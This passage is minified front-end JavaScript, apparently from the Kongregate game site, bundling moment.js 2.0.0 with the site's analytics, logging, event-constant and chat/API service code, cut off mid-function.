t=this;e=e||0,$j.ajax({url:this._activeUser.gameResourcePath()+"/analytics_payload.json",success:this.onAnalyticsPayloadResult.bind(this),error:function(i,n,s){Kongregate.Log.error("Analytics payload request failed, errorCount=",e,i,n,s),e<t.maxRetries()&&t.retryAnalyticsPayload(e+1)}})},retryAnalyticsPayload:function(e){e*=1e4,Kongregate.Log.debug("Retrying analytics payload request after "+e),setTimeout(this.sendAnalyticsPayload.bind(this),e)},onAnalyticsPayloadRequest:function(){this.sendAnalyticsPayload()},onAnalyticsPayloadResult:function(e){Kongregate.Log.debug("Analytics payload received"),e.time_skew=(this.getTime()-moment(e.server_time).toDate().getTime())/1e3,this._eventDispatcher.sendMessage("analytics.payload",{data:{info:this._activeUser.analyticsInfo(),payload:e}})},getTime:function(e){var t;return e&&(t=moment(e).toDate().getTime()),t||(new Date).getTime()},maxRetries:function(){return 5}},ApiLogger={log:function(e,t){Kongregate.Utils.isKlient()&&top.postMessage({type:"kongregate:api-message:log",message:{level:e,message:t}},"*")},echoToConsole:function(e,t){Kongregate.Log[e](t),ApiLogger[e](t)},error:function(e){ApiLogger.log(1,e)},warn:function(e){ApiLogger.log(2,e)},info:function(e){ApiLogger.log(3,e)},debug:function(e){ApiLogger.log(4,e)},spam:function(e){ApiLogger.log(5,e)}},function(e){function t(e,t){return function(i){return c(e.call(this,i),t)}}function i(e){return function(t){return this.lang().ordinal(e.call(this,t))}}function n(){}function s(e){a(this,e)}function o(e){var t=this._data={},i=e.years||e.year||e.y||0,n=e.months||e.month||e.M||0,s=e.weeks||e.week||e.w||0,o=e.days||e.day||e.d||0,a=e.hours||e.hour||e.h||0,c=e.minutes||e.minute||e.m||0,h=e.seconds||e.second||e.s||0;e=e.milliseconds||e.millisecond||e.ms||0,this._milliseconds=e+1e3*h+6e4*c+36e5*a,this._days=o+7*s,this._months=n+12*i,t.milliseconds=e%1e3,h+=r(e/1e3),t.seconds=h%60,c+=r(h/60),t.minutes=c%60,a+=r(c/60),t.hours=a%24,o+=r(a/24),o+=7*s,t.days=o%30,n+=r(o/30),t.months=n%12,i+=r(n/12),t.years=i}function a(e,t){for(var i in t)t.hasOwnProperty(i)&&(e[i]=t[i]);return e}function r(e){return 0>e?Math.ceil(e):Math.floor(e)}function c(e,t){for(e+="";e.length<t;)e="0"+e;return e}function h(e,t,i){var n=t._milliseconds,s=t._days;t=t._months,n&&e._d.setTime(+e+n*i),s&&e.date(e.date()+s*i),t&&(n=e.date(),e.date(1).month(e.month()+t*i).date(Math.min(n,e.daysInMonth())))}function d(e,t){var i,n=Math.min(e.length,t.length),s=Math.abs(e.length-t.length),o=0;for(i=0;i<n;i++)~~e[i]!=~~t[i]&&o++;return o+s}function u(e){return e?(!A[e]&&k&&require("./lang/"+e),A[e]):w.fn._lang}function l(e){return e.match(/\[.*\]/)?e.replace(/^\[|\]$/g,""):e.replace(/\\/g,"")}function _(e,t){function i(t){return e.lang().longDateFormat(t)||t}for(var n=5;n--&&M.test(t);)t=t.replace(M,i);return B[t]||(B[t]=function(e){var t,i=e.match(O),n=0;for(t=i.length;n<t;n++)i[n]=z[i[n]]?z[i[n]]:l(i[n]);return function(s){var o="";for(n=0;n<t;n++)o+="function"==typeof i[n].call?i[n].call(s,e):i[n];return o}}(t)),B[t](e)}function m(e){switch(e){case"DDDD":return L;case"YYYY":return D;case"YYYYY":return x;case"S":case"SS":case"SSS":case"DDD":return N;case"MMM":case"MMMM":case"dd":case"ddd":case"dddd":case"a":case"A":return P;case"X":return K;case"Z":case"ZZ":return U;case"T":return H;case"MM":case"DD":case"YY":case"HH":case"hh":case"mm":case"ss":case"M":case"D":case"d":case"H":case"h":case"m":case"s":return I;default:return new RegExp(e.replace("\\",""))}}function p(e){var t,i=[];if(!e._d){for(t=0;7>t;t++)e._a[t]=i[t]=null==e._a[t]?2===t?1:0:e._a[t];i[3]+=e._tzh||0,i[4]+=e._tzm||0,t=new Date(0),e._useUTC?(t.setUTCFullYear(i[0],i[1],i[2]),t.setUTCHours(i[3],i[4],i[5],i[6])):(t.setFullYear(i[0],i[1],i[2]),t.setHours(i[3],i[4],i[5],i[6])),e._d=t}}function f(e){var t,i,n=e._f.match(O),s=e._i;for(e._a=[],t=0;t<n.length;t++)if((i=(m(n[t]).exec(s)||[])[0])&&(s=s.slice(s.indexOf(i)+i.length)),z[n[t]]){var o=i,a=e,r=a._a;switch(n[t]){case"M":case"MM":r[1]=null==o?0:~~o-1;break;case"MMM":case"MMMM":null!=(i=u(a._l).monthsParse(o))?r[1]=i:a._isValid=!1;break;case"D":case"DD":case"DDD":case"DDDD":null!=o&&(r[2]=~~o);break;case"YY":r[0]=~~o+(68<~~o?1900:2e3);break;case"YYYY":case"YYYYY":r[0]=~~o;break;case"a":case"A":a._isPm="pm"===(o+"").toLowerCase();break;case"H":case"HH":case"h":case"hh":r[3]=~~o;break;case"m":case"mm":r[4]=~~o;break;case"s":case"ss":r[5]=~~o;break;case"S":case"SS":case"SSS":r[6]=~~(1e3*("0."+o));break;case"X":a._d=new Date(1e3*parseFloat(o));break;case"Z":case"ZZ":a._useUTC=!0,(i=(o+"").match(F))&&i[1]&&(a._tzh=~~i[1]),i&&i[2]&&(a._tzm=~~i[2]),i&&"+"===i[0]&&(a._tzh=-a._tzh,a._tzm=-a._tzm)}null==o&&(a._isValid=!1)}e._isPm&&12>e._a[3]&&(e._a[3]+=12),!1===e._isPm&&12===e._a[3]&&(e._a[3]=0),p(e)}function g(e,t,i,n,s){return s.relativeTime(t||1,!!i,e,n)}function v(e,t,i){return t=i-t,(i-=e.day())>t&&(i-=7),i<t-7&&(i+=7),Math.ceil(w(e).add("d",i).dayOfYear()/7)}function b(t){var i=t._i,n=t._f;if(null===i||""===i)return null;if("string"==typeof i&&(t._i=i=u().preparse(i)),w.isMoment(i))(t=a({},i))._d=new Date(+i._d);else if(n)if("[object Array]"===Object.prototype.toString.call(n)){i=t;for(var o,r,c=99;i._f.length;){if((o=a({},i))._f=i._f.pop(),f(o),(n=new s(o)).isValid()){r=n;break}(o=d(o._a,n.toArray()))<c&&(c=o,r=n)}a(i,r)}else f(t);else if(i=(r=t)._i,n=R.exec(i),i===e)r._d=new Date;else if(n)r._d=new Date(+n[1]);else if("string"==typeof i)if(n=r._i,G.exec(n)){for(r._f="YYYY-MM-DDT",i=0;4>i;i++)if(j[i][1].exec(n)){r._f+=j[i][0];break}U.exec(n)&&(r._f+=" Z"),f(r)}else r._d=new Date(n);else"[object Array]"===Object.prototype.toString.call(i)?(r._a=i.slice(0),p(r)):r._d=i instanceof Date?new Date(+i):new Date(i);return new s(t)}function y(e,t){w.fn[e]=w.fn[e+"s"]=function(e){var i=this._isUTC?"UTC":"";return null!=e?(this._d["set"+i+t](e),this):this._d["get"+i+t]()}}function E(e){w.duration.fn[e]=function(){return this._data[e]}}function S(e,t){w.duration.fn["as"+e]=function(){return+this/t}}for(var w,T,C=Math.round,A={},k="undefined"!=typeof module&&module.exports,R=/^\/?Date\((\-?\d+)/i,O=/(\[[^\[]*\])|(\\)?(Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|YYYYY|YYYY|YY|a|A|hh?|HH?|mm?|ss?|SS?S?|X|zz?|ZZ?|.)/g,M=/(\[[^\[]*\])|(\\)?(LT|LL?L?L?|l{1,4})/g,I=/\d\d?/,N=/\d{1,3}/,L=/\d{3}/,D=/\d{1,4}/,x=/[+\-]?\d{1,6}/,P=/[0-9]*[a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+|[\u0600-\u06FF]+\s*?[\u0600-\u06FF]+/i,U=/Z|[\+\-]\d\d:?\d\d/i,H=/T/i,K=/[\+\-]?\d+(\.\d{1,3})?/,G=/^\s*\d{4}-\d\d-\d\d((T| )(\d\d(:\d\d(:\d\d(\.\d\d?\d?)?)?)?)?([\+\-]\d\d:?\d\d)?)?/,j=[["HH:mm:ss.S",/(T| )\d\d:\d\d:\d\d\.\d{1,3}/],["HH:mm:ss",/(T| )\d\d:\d\d:\d\d/],["HH:mm",/(T| )\d\d:\d\d/],["HH",/(T| )\d\d/]],F=/([\+\-]|\d\d)/gi,$="Month Date Hours Minutes Seconds Milliseconds".split(" "),W={Milliseconds:1,Seconds:1e3,Minutes:6e4,Hours:36e5,Days:864e5,Months:2592e6,Years:31536e6},B={},q="DDD w W M D d".split(" "),V="MDHhmswW".split(""),z={M:function(){return this.month()+1},MMM:function(e){return this.lang().monthsShort(this,e)},MMMM:function(e){return this.lang().months(this,e)},D:function(){return this.date()},DDD:function(){return this.dayOfYear()},d:function(){return this.day()},dd:function(e){return this.lang().weekdaysMin(this,e)},ddd:function(e){return this.lang().weekdaysShort(this,e)},dddd:function(e){return this.lang().weekdays(this,e)},w:function(){return this.week()},W:function(){return this.isoWeek()},YY:function(){return c(this.year()%100,2)},YYYY:function(){return c(this.year(),4)},YYYYY:function(){return c(this.year(),5)},a:function(){return this.lang().meridiem(this.hours(),this.minutes(),!0)},A:function(){return this.lang().meridiem(this.hours(),this.minutes(),!1)},H:function(){return this.hours()},h:function(){return this.hours()%12||12},m:function(){return this.minutes()},s:function(){return this.seconds()},S:function(){return~~(this.milliseconds()/100)},SS:function(){return c(~~(this.milliseconds()/10),2)},SSS:function(){return c(this.milliseconds(),3)},Z:function(){var e=-this.zone(),t="+";return 0>e&&(e=-e,t="-"),t+c(~~(e/60),2)+":"+c(~~e%60,2)},ZZ:function(){var e=-this.zone(),t="+";return 0>e&&(e=-e,t="-"),t+c(~~(10*e/6),4)},X:function(){return this.unix()}};q.length;)T=q.pop(),z[T+"o"]=i(z[T]);for(;V.length;)T=V.pop(),z[T+T]=t(z[T],2);for(z.DDDD=t(z.DDD,3),n.prototype={set:function(e){var t;for(t in e){var i=e[t];"function"==typeof i?this[t]=i:this["_"+t]=i}},_months:"January February March April May June July August September October November December".split(" "),months:function(e){return this._months[e.month()]},_monthsShort:"Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec".split(" "),monthsShort:function(e){return this._monthsShort[e.month()]},monthsParse:function(e){var t;for(this._monthsParse||(this._monthsParse=[]),t=0;12>t;t++){if(!this._monthsParse[t]){var i=w([2e3,t]);i="^"+this.months(i,"")+"|^"+this.monthsShort(i,""),this._monthsParse[t]=new RegExp(i.replace(".",""),"i")}if(this._monthsParse[t].test(e))return t}},_weekdays:"Sunday Monday Tuesday Wednesday Thursday Friday Saturday".split(" "),weekdays:function(e){return this._weekdays[e.day()]},_weekdaysShort:"Sun Mon Tue Wed Thu Fri Sat".split(" "),weekdaysShort:function(e){return this._weekdaysShort[e.day()]},_weekdaysMin:"Su Mo Tu We Th Fr Sa".split(" "),weekdaysMin:function(e){return this._weekdaysMin[e.day()]},_longDateFormat:{LT:"h:mm A",L:"MM/DD/YYYY",LL:"MMMM D YYYY",LLL:"MMMM D YYYY LT",LLLL:"dddd, MMMM D YYYY LT"},longDateFormat:function(e){var t=this._longDateFormat[e];return!t&&this._longDateFormat[e.toUpperCase()]&&(t=this._longDateFormat[e.toUpperCase()].replace(/MMMM|MM|DD|dddd/g,(function(e){return e.slice(1)})),this._longDateFormat[e]=t),t},meridiem:function(e,t,i){return 11<e?i?"pm":"PM":i?"am":"AM"},_calendar:{sameDay:"[Today at] LT",nextDay:"[Tomorrow at] LT",nextWeek:"dddd [at] LT",lastDay:"[Yesterday at] LT",lastWeek:"[last] dddd [at] LT",sameElse:"L"},calendar:function(e,t){return"function"==typeof(e=this._calendar[e])?e.apply(t):e},_relativeTime:{future:"in %s",past:"%s ago",s:"a few seconds",m:"a minute",mm:"%d minutes",h:"an hour",hh:"%d hours",d:"a day",dd:"%d days",M:"a month",MM:"%d months",y:"a year",yy:"%d years"},relativeTime:function(e,t,i,n){var s=this._relativeTime[i];return"function"==typeof s?s(e,t,i,n):s.replace(/%d/i,e)},pastFuture:function(e,t){return"function"==typeof(e=this._relativeTime[0<e?"future":"past"])?e(t):e.replace(/%s/i,t)},ordinal:function(e){return this._ordinal.replace("%d",e)},_ordinal:"%d",preparse:function(e){return e},postformat:function(e){return e},week:function(e){return v(e,this._week.dow,this._week.doy)},_week:{dow:0,doy:6}},w=function(e,t,i){return b({_i:e,_f:t,_l:i,_isUTC:!1})},w.utc=function(e,t,i){return b({_useUTC:!0,_isUTC:!0,_l:i,_i:e,_f:t})},w.unix=function(e){return w(1e3*e)},w.duration=function(e,t){var i=w.isDuration(e),n="number"==typeof e,s=i?e._data:n?{}:e;return n&&(t?s[t]=e:s.milliseconds=e),t=new o(s),i&&e.hasOwnProperty("_lang")&&(t._lang=e._lang),t},w.version="2.0.0",w.defaultFormat="YYYY-MM-DDTHH:mm:ssZ",w.lang=function(e,t){if(!e)return w.fn._lang._abbr;t?(t.abbr=e,A[e]||(A[e]=new n),A[e].set(t)):A[e]||u(e),w.duration.fn._lang=w.fn._lang=u(e)},w.langData=function(e){return e&&e._lang&&e._lang._abbr&&(e=e._lang._abbr),u(e)},w.isMoment=function(e){return e instanceof s},w.isDuration=function(e){return e instanceof o},w.fn=s.prototype={clone:function(){return w(this)},valueOf:function(){return+this._d},unix:function(){return Math.floor(+this._d/1e3)},toString:function(){return this.format("ddd MMM DD YYYY HH:mm:ss [GMT]ZZ")},toDate:function(){return this._d},toJSON:function(){return w.utc(this).format("YYYY-MM-DD[T]HH:mm:ss.SSS[Z]")},toArray:function(){return[this.year(),this.month(),this.date(),this.hours(),this.minutes(),this.seconds(),this.milliseconds()]},isValid:function(){return null==this._isValid&&(this._isValid=this._a?!d(this._a,(this._isUTC?w.utc(this._a):w(this._a)).toArray()):!isNaN(this._d.getTime())),!!this._isValid},utc:function(){return this._isUTC=!0,this},local:function(){return this._isUTC=!1,this},format:function(e){return e=_(this,e||w.defaultFormat),this.lang().postformat(e)},add:function(e,t){return h(this,e="string"==typeof e?w.duration(+t,e):w.duration(e,t),1),this},subtract:function(e,t){return h(this,e="string"==typeof e?w.duration(+t,e):w.duration(e,t),-1),this},diff:function(e,t,i){e=this._isUTC?w(e).utc():w(e).local();var n=6e4*(this.zone()-e.zone());if(t&&(t=t.replace(/s$/,"")),"year"===t||"month"===t){n=432e5*(this.daysInMonth()+e.daysInMonth());var s=12*(this.year()-e.year())+(this.month()-e.month());s+=(this-w(this).startOf("month")-(e-w(e).startOf("month")))/n,"year"===t&&(s/=12)}else n=this-e-n,s="second"===t?n/1e3:"minute"===t?n/6e4:"hour"===t?n/36e5:"day"===t?n/864e5:"week"===t?n/6048e5:n;return i?s:r(s)},from:function(e,t){return w.duration(this.diff(e)).lang(this.lang()._abbr).humanize(!t)},fromNow:function(e){return this.from(w(),e)},calendar:function(){var e=this.diff(w().startOf("day"),"days",!0);return e=-6>e?"sameElse":-1>e?"lastWeek":0>e?"lastDay":1>e?"sameDay":2>e?"nextDay":7>e?"nextWeek":"sameElse",this.format(this.lang().calendar(e,this))},isLeapYear:function(){var e=this.year();return 0==e%4&&0!=e%100||0==e%400},isDST:function(){return this.zone()<w([this.year()]).zone()||this.zone()<w([this.year(),5]).zone()},day:function(e){var t=this._isUTC?this._d.getUTCDay():this._d.getDay();return null==e?t:this.add({d:e-t})},startOf:function(e){switch(e=e.replace(/s$/,"")){case"year":this.month(0);case"month":this.date(1);case"week":case"day":this.hours(0);case"hour":this.minutes(0);case"minute":this.seconds(0);case"second":this.milliseconds(0)}return"week"===e&&this.day(0),this},endOf:function(e){return this.startOf(e).add(e.replace(/s?$/,"s"),1).subtract("ms",1)},isAfter:function(e,t){return t=void 0!==t?t:"millisecond",+this.clone().startOf(t)>+w(e).startOf(t)},isBefore:function(e,t){return t=void 0!==t?t:"millisecond",+this.clone().startOf(t)<+w(e).startOf(t)},isSame:function(e,t){return t=void 0!==t?t:"millisecond",+this.clone().startOf(t)==+w(e).startOf(t)},zone:function(){return this._isUTC?0:this._d.getTimezoneOffset()},daysInMonth:function(){return w.utc([this.year(),this.month()+1,0]).date()},dayOfYear:function(e){var t=C((w(this).startOf("day")-w(this).startOf("year"))/864e5)+1;return null==e?t:this.add("d",e-t)},isoWeek:function(e){var t=v(this,1,4);return null==e?t:this.add("d",7*(e-t))},week:function(e){var t=this.lang().week(this);return null==e?t:this.add("d",7*(e-t))},lang:function(t){return t===e?this._lang:(this._lang=u(t),this)}},T=0;T<$.length;T++)y($[T].toLowerCase().replace(/s$/,""),$[T]);for(T in y("year","FullYear"),w.fn.days=w.fn.day,w.fn.weeks=w.fn.week,w.fn.isoWeeks=w.fn.isoWeek,w.duration.fn=o.prototype={weeks:function(){return r(this.days()/7)},valueOf:function(){return this._milliseconds+864e5*this._days+2592e6*this._months},humanize:function(e){var t=+this,i=!e,n=this.lang(),s=C(Math.abs(t)/1e3),o=C(s/60),a=C(o/60),r=C(a/24),c=C(r/365);return(s=45>s&&["s",s]||1===o&&["m"]||45>o&&["mm",o]||1===a&&["h"]||22>a&&["hh",a]||1===r&&["d"]||25>=r&&["dd",r]||45>=r&&["M"]||345>r&&["MM",C(r/30)]||1===c&&["y"]||["yy",c])[2]=i,s[3]=0<t,s[4]=n,i=g.apply({},s),e&&(i=this.lang().pastFuture(t,i)),this.lang().postformat(i)},lang:w.fn.lang},W)W.hasOwnProperty(T)&&(S(T,W[T]),E(T.toLowerCase()));S("Weeks",6048e5),w.lang("en",{ordinal:function(e){var t=e%10;return e+(1==~~(e%100/10)?"th":1===t?"st":2===t?"nd":3===t?"rd":"th")}}),k&&(module.exports=w),"undefined"==typeof ender&&(this.moment=w),"function"==typeof define&&define.amd&&define("moment",[],(function(){return w}))}.call(this);var Kongregate=Kongregate||{};function evalJS(a){eval(a)}function updateTaskProgress(e,t){try{$(e+"-progress-amount").update(t)}catch(i){console.warn("error during updateTaskProgress on %s to %s",e,t)}}function markTaskComplete(e){try{Element.addClassName(e,"complete"),Element.removeClassName(e,"incomplete"),$(e+"-progress")&&Element.hide(e+"-progress"),new Effect.Highlight(e,{})}catch(t){console.warn("error during markTaskComplete on %s",e)}}function markAccomplishmentComplete(e){try{Element.addClassName(e,"complete"),Element.removeClassName(e,"incomplete"),new Effect.Highlight(e,{})}catch(t){console.warn("error during markAccomplishmentComplete on %s",e)}}function GuildChatAuthenticator(){this.initialize()}function GuildRoom(e,t){this.type="guild",this.id="/guilds/"+e+"/rooms/1",this.name=t,this.xmpp_name=this.id}function CapturesToInlineRegistration(){}function JabberChatRoom(e){this.initialize(e)}function JabberConnection(e){this.initialize(e)}function JabberRateLimiter(){this._timestamps=[],this._rules=[{duration:1e3,capacity:2},{duration:6e4,capacity:8}]}function MessageFilter(e){this.initialize(e)}Kongregate.Utils=Kongregate.Utils||{},Kongregate.Utils.isKlient=function(){return/klient|kartridge\//.test(navigator.userAgent.toLowerCase())},Kongregate.Utils.findKongregateWindow=function(){if(!Kongregate.Utils.isKlient())return top;for(var e=window,t=window.parent;t!==top;)t=(e=t).parent;return e},Kongregate.Utils.catchErrors=function(e,t,i){return function(){try{return e.apply(t,arguments)}catch(e){return Kongregate.Log.error("catchErrors caught unhandled exception",e),i}}},function(){function e(e,t,i){Kongregate.Log[e]=function(){try{"undefined"!=typeof active_user&&void 0===Kongregate.Log.debugLevel&&(Kongregate.Log.debugLevel=active_user.debugLevel()),(0===t||Kongregate.Log.debugLevel>=t)&&(console[i]?Function.prototype.apply.call(console[i],console,arguments):console.log(arguments))}catch(e){}}}Kongregate.Log={},e("spam",5,"log"),e("debug",4,"log"),e("info",3,"info"),e("warn",2,"warn"),e("error",1,"error"),e("always",0,"log")}(),KonduitEvent={INIT:"init",CONNECT:"connect",CONNECTED:"connected",DISCONNECT:"disconnect",LOGIN:"login",SWITCH_USER:"switch_user",JOIN_ROOM:"join_room",LEAVE_ROOM:"leave_room",USER_JOIN:"user_join",USER_DEPARTURE:"user_departure",USER_CHANGED:"user_changed",ROOM_MESSAGE:"room_message",SYSTEM_MESSAGE:"system_message",PRIVATE_MESSAGE:"private_message",ADMIN_MESSAGE:"admin_message",MESSAGE_ERROR:"message_error",SET_PRESENCE:"set_presence",GUEST_COUNT:"guest_count",ROOM_NOT_FOUND:"room_not_found",ROOM_FULL:"room_full",REQUEST_CHAT_ROOM:"request_chat_room",CREATE_PRIVATE_ROOM:"create_private_room",DESTROY_PRIVATE_ROOM:"destroy_private_room",PRIVATE_ROOM_INVITATION:"private_room_invitation",PRIVATE_ROOM_KICK:"private_room_kick",PRIVATE_ROOM_INVITATION_SENT:"private_room_invitation_sent",JOIN_GUILD_ROOM:"join_guild_room",SILENCED:"silenced",PARTICIPATE:"participate",AMNESTY:"amnesty",API_INITIALIZED:"api_initialized",ADD_STATISTICS:"add_statistics",STATISTIC_UPDATED:"statistic_updated",STATISTIC_SUBMISSION:"statistic_submission",STATISTICS_FLUSH:"statistics_flush",STATISTICS_FORCE_FLUSH:"statistics_force_flush",SET_ACCOMPLISHMENT_PROGRESS:"set_accomplishment_progress",NEW_HIGH_SCORE:"new_high_score",DISPLAY_SHOUT_BOX:"display_shout_box",DISPLAY_INVITATION_BOX:"display_invitation_box",SEND_PRIVATE_MESSAGE:"send_private_message",DISPLAY_FEED_POST_BOX:"display_feed_post_box",DISPLAY_SIGN_IN_LIGHTBOX:"display_sign_in_lightbox",DISPLAY_REGISTRATION_LIGHTBOX:"display_registration_lightbox",LIGHTBOX_OPENED:"lightbox_opened",LIGHTBOX_CLOSED:"lightbox_closed",ACCOMPLISHMENT_TASK_PROGRESS:"accomplishment_task_progress",ACCOMPLISHMENT_COMPLETE:"accomplishment_complete",RESIZE_GAME:"resize_game",HANDLE_ITEM_CHECKOUT_REQUEST:"handle_item_checkout_request",KONDUIT_MESSAGE:"konduit_message",ANALYTICS_PAYLOAD:"analytics_payload",OP_EXTERNAL_MESSAGE:"ext.msg",OP_CONNECTED:"connected",OP_HELLO:"hello",OP_USER_INFO:"user.info",OP_SIGN_IN:"sign_in",PARAM_USER:"user",PARAM_USER_ID:"user_id",PARAM_GAME_AUTH_TOKEN:"auth_token",PURCHASE_RESULT:"purchase_result",PARAM_LOCALCONNECTION_ONLY:"localconnection_only",CUSTOM_TAB_MESSAGE:"custom_tab_message",CUSTOM_TAB_SHOW:"custom_tab_show",CUSTOM_TAB_CLOSE:"custom_tab_close",CUSTOM_TAB_SHOWN:"custom_tab_shown",CUSTOM_TAB_CLEAR_MESSAGES:"custom_tab_clear_messages",OP_CHAT_TAB:"chat.tab",OP_CHAT_CLEAR_DIALOG:"chat.dlg.clear",OP_CHAT_DISPLAY:"chat.disp",OP_CHAT_MSG:"chat.msg",OP_CHAT_CANVAS_ELEMENT:"chat.elm",OP_CHAT_PRIVATE_MESSAGE:"chat.privateMessage",OP_CHAT_RESIZE_GAME:"chat.resizeGame",OP_CHAT_DISPLAY_INVITATION_BOX:"chat.invite",OP_CHAT_DISPLAY_FEED_POST_BOX:"chat.feedpost",OP_CHAT_DISPLAY_REGISTRATION:"chat.registration",OP_CHAT_DISPLAY_SHOUT_BOX:"chat.shoutbox",PARAM_SHOUT_MESSAGE:"shout_message",PARAM_CANVAS_SIZE:"chat.canvas.size",PARAM_RESIZE_GAME_WIDTH:"chat.resizeGame.width",PARAM_RESIZE_GAME_HEIGHT:"chat.resizeGame.height",PARAM_INVITATION_MESSAGE:"invitation_message",PARAM_FRIEND_FILTER:"filter",PARAM_IMAGE_URI:"image_uri",PARAM_KV_PARAMS:"kv_params",PARAM_NAME:"name",PARAM_DESCRIPTION:"desc",PARAM_DATA:"data",OP_SHOUT_CALLBACK:"ext.shout_callback",PARAM_MESSAGE_TYPE:"ext.message_type",PARAM_MESSAGE_RECIPIENTS:"ext.message_recipients",PARAM_ERROR:"error",PARAM_SUCCESS:"success",PARAM_REQUEST_ID:"req.id",OP_STATS_SUBMIT:"stat.submit",PARAM_STATS:"stats",ITEM_LIST:"mtx.item_list",ITEM_CHECKOUT:"mtx.checkout",PURCHASE_KREDS:"mtx.kred_purchase",ITEM_INSTANCES:"mtx.item_instances",USE_ITEM_INSTANCE:"mtx.use_item_instance",PARAM_PURCHASE_METHOD:"purchase_method",PARAM_ITEM_TAGS:"item_tags",PARAM_ITEMS:"items",PARAM_ORDER_INFO:"order_info",PARAM_ID:"id",ADS_INITIALIZE:"ads.initialize",ADS_AVAILABLE:"ads.available",ADS_UNAVAILABLE:"ads.unavailable",ADS_SHOW_INCENTIVIZED:"ads.show_incentivized",AD_OPENED:"ads.ad_opened",AD_COMPLETED:"ads.ad_completed",AD_ABANDONED:"ads.ad_abandoned",PROCESSING_SAVE_SHARED_CONTENT:"processing_save_shared_content",SAVE_SHARED_CONTENT:"save_shared_content",SAVE_SHARED_CONTENT_COMPLETE:"shared_content_save_complete",LOAD_SHARED_CONTENT:"load_shared_content",BROWSE_SHARED_CONTENT:"browse_shared_content",OP_SAVE_SHARED_CONTENT:"save_shared_content",OP_BROWSE_SHARED_CONTENT:"browse_shared_content",OP_LOAD_SHARED_CONTENT:"load_shared_content",OP_SHARED_CONTENT_SAVE_COMPLETE:"shared_content_save_complete",PARAM_CONTENT_TYPE:"content_type",PARAM_LABEL:"label",PARAM_IMAGE:"image",PARAM_PERMALINK:"permalink",OP_IMAGE_AVATAR_SUBMIT:"avatar.submit",OP_IMAGE_AVATAR_FINISHED:"avatar.finished",IMAGE_AVATAR_SUBMIT:"image_avatar_submit",IMAGE_AVATAR_COMPLETE:"image_avatar_complete",OP_ANALYTICS_PAYLOAD:"analytics.payload",HOLODECK_DATA:"holodeck_data",PARAM_HOLODECK_TYPE:"holodeck_type",FETCH_HISTORY:"fetch_history",HISTORY_RECEIVED:"history_received",FAYE_DISCONNECT:"faye_disconnect"},KonduitChatErrorMessage={MESSAGE_TOO_LONG:"error_msg_too_long",RATE_LIMITED:"error_msg_rate_limit",STICKER:"error_msg_sticker"},KonduitPresenceType={CHAT:"chat",AWAY:"away"},KonduitEventDispatcher=function(){this.initialize()},KonduitEventDispatcher.prototype={initialize:function(){this._callbacks={}},map:function(e,t){var i=this;this.register(e,(function(e){i.fire({type:t,data:e.data})}))},register:function(e,t){this._callbacks.hasOwnProperty(e)||(this._callbacks[e]=[]),this._callbacks[e].push(t)},fire:function(e){var t=e.type;if(this._callbacks.hasOwnProperty(t))for(var i=0,n=this._callbacks[t].length;i<n;i++)this._callbacks[t][i](e)},sendMessage:function(e,t){this.fire({type:KonduitEvent.KONDUIT_MESSAGE,opcode:e,params:t||{}})}},ApiService=function(e){this.initialize(e)},ApiService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._createServices(e),this._mapEvents(),this._eventDispatcher.register(KonduitEvent.OP_HELLO,this._onClientConnected.bind(this)),this._eventDispatcher.register(KonduitEvent.SWITCH_USER,this._sendUserInfo.bind(this))},_mapEvent:function(e,t){ApiService._mapEvent(this._eventDispatcher,e,t)},_mapEvents:function(){this._mapEvent("chat.sign",KonduitEvent.DISPLAY_SIGN_IN_LIGHTBOX),this._mapEvent("chat.registration",KonduitEvent.DISPLAY_REGISTRATION_LIGHTBOX),this._mapEvent("chat.shoutbox",KonduitEvent.DISPLAY_SHOUT_BOX),this._mapEvent("chat.feedpost",KonduitEvent.DISPLAY_FEED_POST_BOX),this._mapEvent("chat.invite",KonduitEvent.DISPLAY_INVITATION_BOX),this._mapEvent("chat.privateMessage",KonduitEvent.SEND_PRIVATE_MESSAGE),this._mapEvent("chat.resizeGame",KonduitEvent.RESIZE_GAME)},_createServices:function(e){new StatisticService({event_dispatcher:e.event_dispatcher,active_user:e.active_user,statistics:e.statistics,is_connected:e.is_connected}).start(),new AnalyticsService({event_dispatcher:e.event_dispatcher,active_user:e.active_user}),new MicrotransactionService({event_dispatcher:e.event_dispatcher,active_user:e.active_user}),new AdService({event_dispatcher:e.event_dispatcher,active_user:e.active_user,ad_manager:e.ad_manager}),new SharedContentService({event_dispatcher:e.event_dispatcher,active_user:e.active_user}),new ImageService({event_dispatcher:e.event_dispatcher,active_user:e.active_user}),new ChatService({event_dispatcher:e.event_dispatcher,active_user:e.active_user})},_onClientConnected:function(){this._eventDispatcher.sendMessage(KonduitEvent.OP_HELLO,{success:!0}),this._sendUserInfo(),this._eventDispatcher.fire({type:KonduitEvent.API_INITIALIZED})},_sendUserInfo:function(){this._eventDispatcher.sendMessage(KonduitEvent.OP_USER_INFO,{user:this._activeUser.username(),user_id:this._activeUser.id(),auth_token:this._activeUser.gameAuthToken()}),this._eventDispatcher.fire({type:KonduitEvent.ANALYTICS_PAYLOAD})}},ApiService._mapEvent=function(e,t,i){e.register(t,(function(t){e.fire({type:i,data:t.data})}))},ChatService=function(e){this.initialize(e)},ChatService.prototype={initialize:function(e){this._activeUser=e.active_user||window.active_user,this._eventDispatcher=e.event_dispatcher,this._konduitToCanvas=e.canvas_dispatcher||window.konduitToCanvas,this._queuedMessages=[],this._customTabShowing=!1,this._activeUser.chatApiEnabled()&&(this._eventDispatcher.register(KonduitEvent.OP_CHAT_TAB,this.onChatTabRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_CHAT_CLEAR_DIALOG,this.clearChat.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_CHAT_DISPLAY,this.onChatDisplayRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_CHAT_MSG,this.onCustomTabMessage.bind(this)),this._eventDispatcher.register(KonduitEvent.OP_CHAT_CANVAS_ELEMENT,this.onCanvasElementRequest.bind(this)),this._eventDispatcher.register(KonduitEvent.CUSTOM_TAB_SHOWN,this.onCustomTabShown.bind(this)))},closeTab:function(){Kongregate.Log.info("Closing 